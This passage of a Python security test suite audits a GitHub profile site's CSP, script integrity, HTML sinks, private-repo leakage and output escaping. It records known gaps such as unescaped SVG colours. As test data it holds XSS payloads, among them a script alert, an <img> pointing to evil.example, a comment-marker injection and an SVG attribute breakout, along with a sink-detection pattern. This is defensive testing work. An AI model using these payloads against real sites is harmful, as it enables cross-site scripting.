def _csp():
    assert CSP, "no CSP meta tag"
    return {d.split()[0]: d.split()[1:] for d in (x.strip() for x in CSP.group(1).split(";")) if d}


@check("CSP: default-src 'none', no unsafe-inline/eval in script-src, object-src/base-uri 'none'")
def _():
    c = _csp()
    assert c.get("default-src") == ["'none'"], c.get("default-src")
    s = c.get("script-src", [])
    assert s and not any(x in s for x in ("'unsafe-inline'", "'unsafe-eval'", "*", "data:", "blob:", "http:", "https:")), s
    assert c.get("object-src") == ["'none'"] and c.get("base-uri") == ["'none'"] and c.get("form-action") == ["'none'"]
    assert "<script>" not in INDEX and not re.search(r"<script(?![^>]*\bsrc=)[^>]*>", INDEX), "inline script present"
    assert not re.search(r"\son[a-z]+=", INDEX), "inline event handler present"
    return CSP.group(1)


@check("every cross-origin <script> has SRI (sha384+) and crossorigin, with an exact version")
def _():
    tags = re.findall(r"<script[^>]+src=\"(https?://[^\"]+)\"[^>]*>", INDEX)
    full = re.findall(r"<script[^>]+src=\"https?://[^>]+>", INDEX)
    assert tags, "no external scripts?"
    for tag, src in zip(full, tags):
        assert re.search(r'integrity="sha(384|512)-[A-Za-z0-9+/=]{40,}"', tag), f"no SRI: {src}"
        assert 'crossorigin="anonymous"' in tag, f"no crossorigin: {src}"
        assert re.search(r"@\d+\.\d+\.\d+/", src), f"floating version: {src}"
    return ", ".join(tags)


@check("site JS uses no HTML-parsing sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, Function, d3 .html)")
def _():
    sinks = re.compile(r"\.innerHTML|\.outerHTML|insertAdjacentHTML|document\.write|\beval\(|new Function|\.html\(|setTimeout\(\s*['\"`]|srcdoc")
    hits = [(p.name, l.strip()[:80]) for p in (REPO / "site" / "js").glob("*.js")
            for l in p.read_text().splitlines() if sinks.search(l)]
    assert not hits, hits
    return f"{len(list((REPO / 'site' / 'js').glob('*.js')))} files clean"


@check("site/data.json has no private-repo fields and only https://github.com/<owner>/ repo URLs")
def _():
    d = json.loads((REPO / "site" / "data.json").read_text())
    assert "isPrivate" not in json.dumps(d)
    for r in d["repos"]:
        assert r["url"].startswith(f"https://github.com/{OWNER}/") and r["url"].endswith("/" + r["name"]), r["url"]
        assert re.fullmatch(r"[A-Za-z0-9._-]+", r["name"]), r["name"]
    assert d["identity"]["linkedin"].startswith("https://")
    return f"{len(d['repos'])} repos"


@gap("CSP script-src allows all of https://cdn.jsdelivr.net (serves any npm/GitHub file)")
def _():
    s = _csp().get("script-src", [])
    if "https://cdn.jsdelivr.net" not in s:
        raise _GapClosed(str(s))
    return "script-src " + " ".join(s) + " -> pin to the exact file URL or self-host d3"


@gap("CSP style-src keeps 'unsafe-inline' (not needed: site uses CSSOM only)")
def _():
    if "'unsafe-inline'" not in _csp().get("style-src", []):
        raise _GapClosed("removed")
    return "style-src " + " ".join(_csp()["style-src"])


@gap("no clickjacking defence: meta CSP cannot carry frame-ancestors and there is no frame-buster")
def _():
    js = "".join(p.read_text() for p in (REPO / "site" / "js").glob("*.js"))
    if re.search(r"top\s*!==?\s*(self|window)|window\.top\s*!==?", js):
        raise _GapClosed("frame-buster present")
    return "GitHub Pages cannot send X-Frame-Options / CSP headers"


@gap("no Trusted Types enforcement (require-trusted-types-for 'script')")
def _():
    if "require-trusted-types-for" in CSP.group(1):
        raise _GapClosed("enforced")
    return "site has no HTML sinks, so TT could be enforced at zero cost"


# --------------------------------------------------------------------------
# 6. Render pipeline: privacy + output encoding (needs numpy)
# --------------------------------------------------------------------------

print("\n== Render pipeline ==")


def _snapshot():
    def repo(name, private=False, desc="", lang=("Python", "#3572A5"), readme="", topics=(), days=10):
        return {"name": name, "description": desc, "url": f"https://github.com/{OWNER}/{name}", "isPrivate": private,
                "isArchived": False, "createdAt": iso(NOW - dt.timedelta(days=days + 30)), "pushedAt": iso(NOW - dt.timedelta(days=days)),
                "stargazerCount": 1, "primaryLanguage": {"name": lang[0], "color": lang[1]}, "topics": list(topics),
                "languages": [{"name": lang[0], "color": lang[1], "size": 50_000}], "readme": readme}
    words = ["voice agent call twilio", "rag retrieval qdrant embedding", "playwright browser automation replay",
             "drug fda pubmed clinical", "regression xgboost churn prediction", "dashboard eda insights pricing"]
    repos = [repo(f"pub-{i}", desc=f"{w} project {i}", readme=(w + " ") * 30, topics=w.split()[:2], days=i) for i, w in enumerate(words * 2)]
    hostile = ('<script>alert(1)</script> ]]> & "q" \'s | pipe\nnewline <!--live:recent:end--> '
               '<img src=https://evil.example/px.png> @everyone')
    repos.insert(0, repo("pub-hostile", desc=hostile, readme="voice agent " * 20, topics=["voice"], days=0))
    priv = repo("PRIVCANARY-repo", private=True, desc="PRIVCANARY secret plans", lang=("PrivCanaryLang", "#123456"),
                readme="PRIVCANARY " * 50 + "voice agent rag", topics=["privcanary-topic"], days=0)
    priv["url"] = f"https://github.com/{OWNER}/PRIVCANARY-repo"
    repos.append(priv)
    cal = [{"date": (NOW - dt.timedelta(days=364 - i)).date().isoformat(), "count": i % 4} for i in range(365)]
    return {"login": OWNER, "name": "N", "fetched_at": iso(NOW), "repos": repos, "calendar": cal,
            "lifetime_contributions": 1000, "restricted_contributions": 5,
            "commit_repos": [{"name": "pub-1", "url": f"https://github.com/{OWNER}/pub-1", "isPrivate": False, "count": 9},
                             {"name": "PRIVCANARY-commit", "url": f"https://github.com/{OWNER}/PRIVCANARY-commit", "isPrivate": True, "count": 40}]}


def _render(snap):
    try:
        import numpy  # noqa: F401
    except ImportError:
        raise _Skip("numpy not installed")
    import tomllib
    bp = _load("build_profile_under_test", REPO / "scripts" / "build_profile.py")
    cfg = tomllib.loads(ORIG_TOML)
    m = bp.metrics.compute(snap, cfg)
    files, live, data = bp.render(m, cfg)
    readme = README_MOD.update(ORIG_README, m, live)
    return m, files, live, data, readme


_RENDER_CACHE = {}


def rendered():
    if "r" not in _RENDER_CACHE:
        _RENDER_CACHE["r"] = _render(_snapshot())
    return _RENDER_CACHE["r"]


@check("private repo name/description/url/readme/topics/commit-repo never reach SVGs, README or data.json")
def _():
    m, files, live, data, readme = rendered()
    blob = "\n".join(files.values()) + "\n".join(live.values()) + data + readme
    for c in ("PRIVCANARY-repo", "PRIVCANARY secret", "PRIVCANARY-commit", "privcanary-topic", "privcanary "):
        assert c.lower() not in blob.lower().replace("privcanarylang", ""), f"private canary {c!r} leaked"
    d = json.loads(data)
    assert all(not r["name"].startswith("PRIV") for r in d["repos"])
    assert d["totals"]["private_commits"] == 40
    return "only anonymous totals (private_commits=40) present"


@check("rendered SVGs are well-formed XML with no script/foreignObject/event handlers, hostile description escaped")
def _():
    _, files, *_ = rendered()
    for name, svg in files.items():
        root = ET.fromstring(svg)
        for el in root.iter():
            tag = el.tag.split("}")[-1].lower()
            assert tag not in ("script", "foreignobject", "iframe", "a"), f"{name}: <{tag}>"
            assert not any(k.lower().startswith("on") or "href" in k.lower() for k in el.attrib), f"{name}: {el.attrib}"
    return f"{len(files)} SVGs parsed"


@check("README tables: hostile description cannot add columns/rows")
def _():
    _, _, live, _, _ = rendered()
    for name in ("recent", "repos", "clusters"):
        rows = [l for l in live[name].splitlines() if l.startswith("|")]
        if not rows:
            continue
        cols = len(re.split(r"(?<!\\)\|", rows[0]))
        for r in rows:
            assert len(re.split(r"(?<!\\)\|", r)) == cols, f"{name}: column count changed: {r[:100]}"
    return "column counts stable"


@check("site/data.json is valid JSON and hostile strings survive only as data")
def _():
    _, _, _, data, _ = rendered()
    d = json.loads(data)
    h = [r for r in d["repos"] if r["name"] == "pub-hostile"][0]
    assert "<script>" in h["description"]   # stays data; the site renders via textContent (see Playwright suite)


@gap("private repos' LANGUAGE names still appear (agent-trace/training-run SVGs, data.json languages)")
def _():
    _, files, live, data, _ = rendered()
    blob = "\n".join(files.values()) + data
    if "PrivCanaryLang" not in blob:
        raise _GapClosed("private-only languages hidden")
    return "a language used only in a private repo is named (aggregate by design; leaks tech of private work)"


@gap("repo description HTML/markers are not neutralised in README tables (owner-controlled input)")
def _():
    _, _, live, _, readme = rendered()
    again = README_MOD.replace_section(readme, "recent", live["recent"])
    issues = []
    if "<img src=https://evil.example" in live["recent"]:
        issues.append("raw <img> rendered by GitHub")
    if readme.count("<!--live:recent:end-->") != 1 or again.count("<!--live:recent:end-->") != 1:
        issues.append(f"live:recent end marker count {again.count('<!--live:recent:end-->')}")
    if not issues:
        raise _GapClosed("descriptions are HTML-escaped")
    return "; ".join(issues)


@gap("language colour from the API is written into SVG fill= without escaping")
def _():
    snap = _snapshot()
    snap["repos"][0]["primaryLanguage"]["color"] = '#fff"/><script>alert(1)</script><x a="'
    _, files, *_ = _render(snap)
    bad = [n for n, s in files.items() if "<script>" in s]
    if not bad:
        raise _GapClosed("colour escaped/validated")
    try:
        ET.fromstring(files[bad[0]])
        return f"{bad[0]} contains a raw <script> element (GitHub serves README SVGs as <img>, so inert there)"
    except ET.ParseError:
        return f"{bad[0]} becomes malformed -> raw <script> text in output"


# --------------------------------------------------------------------------

shutil.rmtree(SANDBOX, ignore_errors=True)
counts = {k: sum(1 for s, _, _ in RESULTS if s == k) for k in ("PASS", "FAIL", "KNOWN-GAP", "GAP-CLOSED", "SKIP")}
print("\nSummary: " + "  ".join(f"{k}={v}" for k, v in counts.items()))
sys.exit(1 if counts["FAIL"] else 0)
